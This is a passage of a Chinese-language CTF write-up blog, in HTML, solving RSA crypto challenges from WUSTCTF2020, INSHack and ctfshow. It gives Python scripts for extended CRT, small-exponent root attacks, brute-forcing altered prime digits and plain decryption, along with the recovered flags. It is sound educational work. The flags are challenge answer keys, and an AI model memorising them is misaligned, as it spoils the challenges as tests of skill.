&#x2F;&#x2F; d    n2 &#x3D; n2 &#x2F;&#x2F; d    c *&#x3D; gmpy2.invert(n1, n2)    c %&#x3D; n2    c *&#x3D; n1 * d    c +&#x3D; a1    global n3    global a3    n3 &#x3D; n1 * n2 * d    a3 &#x3D; (c % n3 + n3) % n3    return 1def exCRT(a, n):    a1 &#x3D; a[0]    n1 &#x3D; n[0]    le &#x3D; len(a)    for i in range(1, le):        a2 &#x3D; a[i]        n2 &#x3D; n[i]        if not merge(a1, n1, a2, n2):            return -1        a1 &#x3D; a3        n1 &#x3D; n3    global mod    mod &#x3D; n1    return (a1 % n1 + n1) % n1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用时将a、n两个list带入即可。适合的情况为：</p><script type="math/tex; mode=display">m ^ e ≡ c \quad mod \quad n</script><p>此时的话，欲求这个<code>m^e</code>，只需有几组对应的<code>c</code>和<code>n</code>的数据即可带入上方的<code>exCRT(a,n)</code>来求。</p><h4 id="小e值时的碰撞脚本"><a href="#小e值时的碰撞脚本" class="headerlink" title="小e值时的碰撞脚本"></a>小e值时的碰撞脚本</h4><blockquote><p>RSA不免遇到这种情况，当碰到小e的时候，下面的碰撞脚本也许能派上用场</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">rune</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>n<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>    k<span class="token operator">=</span><span class="token number">0</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        x<span class="token operator">=</span>c<span class="token operator">+</span>k<span class="token operator">*</span>n        <span class="token keyword">if</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>e<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>e<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        k<span class="token operator">=</span>k<span class="token operator">+</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其实这个脚本适用的也是下面的这个公式的情况，只不过对于这个e很小的这种情况是直接可以求出这个m，也就是明文信息的。</p><script type="math/tex; mode=display">m ^ e ≡ c \quad mod \quad n</script><h3 id="使用rsa的方式"><a href="#使用rsa的方式" class="headerlink" title="使用rsa的方式"></a>使用rsa的方式</h3><h4 id="WUSTCTF2020-情书"><a href="#WUSTCTF2020-情书" class="headerlink" title="[WUSTCTF2020]情书"></a>[WUSTCTF2020]情书</h4><pre class="line-numbers language-none"><code class="language-none">Premise: Enumerate the alphabet by 0、1、2、.....  、25Using the RSA system Encryption:0156 0821 1616 0041 0140 2130 1616 0793Public Key:2537 and 13Private Key:2537 and 937flag: wctf2020&#123;Decryption&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个题目根据提示采用的是rsa的加密系统，这里翻译一下就是</p><pre class="line-numbers language-none"><code class="language-none">n&#x3D;2537e&#x3D;13d&#x3D;937<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>大概就像是这样进行解密的</p><p><img src="/2021/05/28/CTF/image-20210726202807984.png" alt></p><p>写出一个简单的脚本即可</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">ciphertext <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token string">'0156 0821 1616 0041 0140 2130 1616 0793'</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>n<span class="token operator">=</span><span class="token number">2537</span>d<span class="token operator">=</span><span class="token number">937</span>plaintext <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> c <span class="token keyword">in</span> ciphertext<span class="token punctuation">:</span>    m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>    plaintext <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">97</span> <span class="token operator">+</span> m<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">)</span><span class="token comment"># iloveyou</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="INSHack2017-rsa16m"><a href="#INSHack2017-rsa16m" class="headerlink" title="[INSHack2017]rsa16m"></a>[INSHack2017]rsa16m</h4><p><strong>TAG: n、c超级大，e正常</strong></p><p>这个题给出的两个参数超级大，怎么形容呢？我打开文件用了几十秒。。。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'rsa_16m.txt'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>    c <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">3</span><span class="token punctuation">]</span>    c <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    e <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    e <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    m <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>c<span class="token punctuation">,</span> e<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>    flag <span class="token operator">=</span> m<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">"""(mpz(30156321943599743278455918182580886589695285093075236154009535613), True)b'INSA&#123;(I)NSA_W0uld_bE_pr0uD&#125;'"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个m远小于n的情况下直接对c求e的次方根就有可能可以解出来这个m。</p><h4 id="INSHack2019-Yet-Another-RSA-Challenge-Part-1"><a href="#INSHack2019-Yet-Another-RSA-Challenge-Part-1" class="headerlink" title="[INSHack2019]Yet Another RSA Challenge - Part 1"></a>[INSHack2019]Yet Another RSA Challenge - Part 1</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""import subprocessp = subprocess.check_output('openssl prime -generate -bits 2048 -hex')q = subprocess.check_output('openssl prime -generate -bits 2048 -hex')flag = int('INSA&#123;REDACTED&#125;'.encode('hex'), 16)N = int(p,16) * int(q,16)print Nprint '0x'+p.replace('9F','FC')print pow(flag,65537,N)"""</span><span class="token comment"># FC可能是9F，也可能是FC，爆破</span><span class="token keyword">import</span> itertools<span class="token keyword">import</span> gmpy2<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'output.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>n <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>c <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>p <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>np <span class="token operator">=</span> p<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'FC'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>np<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 共4个FC</span>dic <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'FC'</span><span class="token punctuation">,</span> <span class="token string">'9F'</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">getp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> a <span class="token keyword">in</span> dic<span class="token punctuation">:</span>        <span class="token keyword">for</span> b <span class="token keyword">in</span> dic<span class="token punctuation">:</span>            <span class="token keyword">for</span> c <span class="token keyword">in</span> dic<span class="token punctuation">:</span>                <span class="token keyword">for</span> d <span class="token keyword">in</span> dic<span class="token punctuation">:</span>                    p <span class="token operator">=</span> np<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> a <span class="token operator">+</span> np<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> b <span class="token operator">+</span> np<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> c <span class="token operator">+</span> np<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> d <span class="token operator">+</span> np<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span>                    p <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>                    q <span class="token operator">=</span> n <span class="token operator">//</span> p                    <span class="token keyword">if</span> n <span class="token operator">==</span> p <span class="token operator">*</span> q<span class="token punctuation">:</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"I have got p:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>p<span class="token punctuation">&#125;</span></span><span class="token string">、q:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>q<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>                        <span class="token keyword">return</span> p<span class="token punctuation">,</span> qp<span class="token punctuation">,</span> q <span class="token operator">=</span> getp<span class="token punctuation">(</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span><span class="token number">0x10001</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># b'INSA&#123;I_w1ll_us3_OTp_n3xT_T1M3&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>部分替换，爆破一下即可得到p。ps：用在线的也行，但是考虑到线下没网，所以尽量使用脚本。</p><h3 id="一般rsa"><a href="#一般rsa" class="headerlink" title="一般rsa"></a>一般rsa</h3><h4 id="buu、rsa"><a href="#buu、rsa" class="headerlink" title="buu、rsa"></a>buu、rsa</h4><p>题目描述：ras是一个非常神秘的算法，那么它神秘在哪里 请少侠自己摸索！ 注意：得到的 flag 请包上 flag{} 提交</p><p>文件给出的是</p><p><img src="/2021/05/28/CTF/image-20210531094155238.png" alt="这两个文件"></p><p>？？？发生什么事了，这不是密码学的前几天做过的那个啥啥啥嘛。</p><p><a href="http://tool.chacuo.net/cryptrsakeyparse">在线rsa公钥文件分解</a></p><p><a href="https://www.ssleye.com/pub_asysi.html">在线rsa公钥文件分解2（n分解为十进制）</a></p><p>直接把pub.key文件内的内容复制到上面的网站内分解一下p、q、n。</p><p><img src="/2021/05/28/CTF/image-20210531094620593.png" alt="获得模数与指数"></p><p>再在线分解一下大整数n得下面的一些数据</p><pre class="line-numbers language-data" data-language="data"><code class="language-data">e &#x3D; 65537n &#x3D; 86934482296048119190666062003494800588905656017203025617216654058378322103517p &#x3D; 285960468890451637935629440372639283459q &#x3D; 304008741604601924494328155975272418463<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>写下面得python脚本解密</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> rsa<span class="token keyword">import</span> gmpy2e <span class="token operator">=</span> <span class="token number">65537</span>n <span class="token operator">=</span> <span class="token number">86934482296048119190666062003494800588905656017203025617216654058378322103517</span>p <span class="token operator">=</span> <span class="token number">285960468890451637935629440372639283459</span>q <span class="token operator">=</span> <span class="token number">304008741604601924494328155975272418463</span>phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span><span class="token punctuation">)</span>key <span class="token operator">=</span> rsa<span class="token punctuation">.</span>PrivateKey<span class="token punctuation">(</span>n<span class="token punctuation">,</span> e<span class="token punctuation">,</span> d<span class="token punctuation">,</span> p<span class="token punctuation">,</span> q<span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag.enc'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> encflag<span class="token punctuation">:</span>    flag <span class="token operator">=</span> rsa<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>encflag<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># b'flag&#123;decrypt_256&#125;\n'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="ctfshow、crypto4"><a href="#ctfshow、crypto4" class="headerlink" title="ctfshow、crypto4"></a>ctfshow、crypto4</h4><p><strong>TAG: 简单求d</strong></p><p>给出条件如下</p><pre class="line-numbers language-none"><code class="language-none">p&#x3D;447685307q&#x3D;2037e&#x3D;17求d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>写简单脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2p<span class="token operator">=</span><span class="token number">447685307</span>q<span class="token operator">=</span><span class="token number">2037</span>e<span class="token operator">=</span><span class="token number">17</span>phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token comment"># 53616899001</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="ctfshow、crypto4-1"><a href="#ctfshow、crypto4-1" class="headerlink" title="ctfshow、crypto4"></a>ctfshow、crypto4</h4><p><strong>TAG: 简单求m</strong></p><p>给出条件如下</p><pre class="line-numbers language-none"><code class="language-none">p&#x3D;447685307q&#x3D;2037e&#x3D;17c&#x3D;704796792<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>继续把上面的脚本完善一下就ok了</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytesp<span class="token operator">=</span><span class="token number">447685307</span>q<span class="token operator">=</span><span class="token number">2037</span>e<span class="token operator">=</span><span class="token number">17</span>phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token comment"># 53616899001</span>c<span class="token operator">=</span><span class="token number">704796792</span>n <span class="token operator">=</span> p <span class="token operator">*</span> qm <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token comment"># 904332399012</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 看来m并不是任何有意义的信息</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="ctfshow、babyrsa"><a href="#ctfshow、babyrsa" class="headerlink" title="ctfshow、babyrsa"></a>ctfshow、babyrsa</h4><p><strong>TAG: 有p、q、e、c</strong></p><pre class="line-numbers language-none"><code class="language-none">e &#x3D; 65537p &#x3D; 104046835712664064779194734974271185635538927889880611929931939711001301561682270177931622974642789920918902563361293345434055764293612446888383912807143394009019803471816448923969637980671221111117965227402429634935481868701166522350570364727873283332371986860194245739423508566783663380619142431820861051179q &#x3D; 140171048074107988605773731671018901813928130582422889797732071529733091703843710859282267763783461738242958098610949120354497987945911021170842457552182880133642711307227072133812253341129830416158450499258216967879857581565380890788395068130033931180395926482431150295880926480086317733457392573931410220501c &#x3D; 4772758911204771028049020670778336799568778930072841084057809867608022732611295305096052430641881550781141776498904005589873830973301898523644744951545345404578466176725030290421649344936952480254902939417215148205735730754808467351639943474816280980230447097444682489223054499524197909719857300597157406075069204315022703894466226179507627070835428226086509767746759353822302809385047763292891543697277097068406512924796409393289982738071019047393972959228919115821862868057003145401072581115989680686073663259771587445250687060240991265143919857962047718344017741878925867800431556311785625469001771370852474292194<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>直接解</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytese <span class="token operator">=</span> <span class="token number">65537</span>p <span class="token operator">=</span> <span class="token number">104046835712664064779194734974271185635538927889880611929931939711001301561682270177931622974642789920918902563361293345434055764293612446888383912807143394009019803471816448923969637980671221111117965227402429634935481868701166522350570364727873283332371986860194245739423508566783663380619142431820861051179</span>q <span class="token operator">=</span> <span class="token number">140171048074107988605773731671018901813928130582422889797732071529733091703843710859282267763783461738242958098610949120354497987945911021170842457552182880133642711307227072133812253341129830416158450499258216967879857581565380890788395068130033931180395926482431150295880926480086317733457392573931410220501</span>c <span class="token operator">=</span> <span class="token number">4772758911204771028049020670778336799568778930072841084057809867608022732611295305096052430641881550781141776498904005589873830973301898523644744951545345404578466176725030290421649344936952480254902939417215148205735730754808467351639943474816280980230447097444682489223054499524197909719857300597157406075069204315022703894466226179507627070835428226086509767746759353822302809385047763292891543697277097068406512924796409393289982738071019047393972959228919115821862868057003145401072581115989680686073663259771587445250687060240991265143919857962047718344017741878925867800431556311785625469001771370852474292194</span>phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span>n <span class="token operator">=</span> p <span class="token operator">*</span> qm <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># flag&#123;b4by_R5A&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="ctfshow、babyrsa-1"><a href="#ctfshow、babyrsa-1" class="headerlink" title="ctfshow、babyrsa"></a>ctfshow、babyrsa</h4><p><strong>TAG: 有n、e、c</strong></p><p>先分解大整数n</p><pre class="line-numbers language-none"><code class="language-none">e &#x3D; 65537n &#x3D; 1455925529734358105461406532259911790807347616464991065301847c &#x3D; 69380371057914246192606760686152233225659503366319332065009p &#x3D; 1201147059438530786835365194567<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytese <span class="token operator">=</span> <span class="token number">65537</span>n <span class="token operator">=</span> <span class="token number">1455925529734358105461406532259911790807347616464991065301847</span>c <span class="token operator">=</span> <span class="token number">69380371057914246192606760686152233225659503366319332065009</span>p <span class="token operator">=</span> <span class="token number">1201147059438530786835365194567</span>q <span class="token operator">=</span> n <span class="token operator">//</span> pphi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># flag&#123;fact0r_sma11_N&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="ctfshow、easyrsa2"><a href="#ctfshow、easyrsa2" class="headerlink" title="ctfshow、easyrsa2"></a>ctfshow、easyrsa2</h4><p><strong>TAG: 简单rsa</strong></p><pre class="line-numbers language-none"><code class="language-none">e &#x3D; 65537n &#x3D; 23686563925537577753047229040754282953352221724154495390687358877775380147605152455537988563490716943872517593212858326146811511103311865753018329109314623702207073882884251372553225986112006827111351501044972239272200616871716325265416115038890805114829315111950319183189591283821793237999044427887934536835813526748759612963103377803089900662509399569819785571492828112437312659229879806168758843603248823629821851053775458651933952183988482163950039248487270453888288427540305542824179951734412044985364866532124803746008139763081886781361488304666575456680411806505094963425401175510416864929601220556158569443747c &#x3D; 1627484142237897613944607828268981193911417408064824540711945192035649088104133038147400224070588410335190662682231189997580084680424209495303078061205122848904648319219646588720994019249279863462981015329483724747823991513714172478886306703290044871781158393304147301058706003793357846922086994952763485999282741595204008663847963539422096343391464527068599046946279309037212859931303335507455146001390326550668531665493245293839009832468668390820282664984066399051403227990068032226382222173478078505888238749583237980643698405005689247922901342204142833875409505180847943212126302482358445768662608278731750064815p &#x3D; 149751992878258417619955913803349588855907883795437275015624379454686823076475394292360761230383018058515386650339444595246524276345367505681814522035068825010950620582957883108812048922184886717309007677307472277565963907119402324227023856527902596769190955018836727291623263893333224367236239361837356140243-------------------------------------------------------------------------------------------------------------------e &#x3D; 65537n &#x3D; 22257605320525584078180889073523223973924192984353847137164605186956629675938929585386392327672065524338176402496414014083816446508860530887742583338880317478862512306633061601510404960095143941320847160562050524072860211772522478494742213643890027443992183362678970426046765630946644339093149139143388752794932806956589884503569175226850419271095336798456238899009883100793515744579945854481430194879360765346236418019384644095257242811629393164402498261066077339304875212250897918420427814000142751282805980632089867108525335488018940091698609890995252413007073725850396076272027183422297684667565712022199054289711c &#x3D; 2742600695441836559469553702831098375948641915409106976157840377978123912007398753623461112659796209918866985480471911393362797753624479537646802510420415039461832118018849030580675249817576926858363541683135777239322002741820145944286109172066259843766755795255913189902403644721138554935991439893850589677849639263080528599197595705927535430942463184891689410078059090474682694886420022230657661157993875931600932763824618773420077273617106297660195179922018875399174346863404710420166497017196424586116535915712965147141775026549870636328195690774259990189286665844641289108474834973710730426105047318959307995062p &#x3D; 148629777091647844246796264243541316933219734934432518942362371402056651201924476622085034421034723763998765357939318936167411912678961237019833852640423223833408458277374583926678987391357358691970765804588287101985728943684133878401175077872266031328212861797034052872034250560671628711714389757777347537077<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个估计他的意思是让手搓的，但是在线的可以出来就也不手搓了。</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;m0_bv_hv_sv&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上下两部分接出来的flag是相同的，更加确定了这个应该是让用脚本自己推出来m的，但是我懒得推，估计是与e有关的。</p><h4 id="ctfshow、easyrsa6"><a href="#ctfshow、easyrsa6" class="headerlink" title="ctfshow、easyrsa6"></a>ctfshow、easyrsa6</h4><p><strong>TAG: p、q相距很近</strong></p><p>看脚本</p><pre class="line-numbers language-python" data-language="python"><code 